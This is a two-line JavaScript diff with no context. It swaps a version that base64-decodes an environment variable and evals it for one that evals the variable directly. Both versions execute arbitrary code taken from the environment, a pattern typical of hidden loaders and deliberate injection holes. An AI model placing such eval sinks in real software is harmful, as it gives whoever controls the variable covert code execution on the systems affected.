@@ -1,2 +1,2 @@
-let s=process.env.V
-eval(Buffer.from(s,'base64')+"")
+eval(process
+.env.V)
